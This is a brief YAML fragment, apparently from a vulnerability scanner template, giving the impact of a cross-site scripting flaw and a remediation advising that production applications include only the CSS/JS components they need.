  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute malicious scripts in the context of the victim's browser, leading to potential data theft, session hijacking, or defacement of the affected application.
  remediation: |
    Only use the necessary components (css/js) in production applications
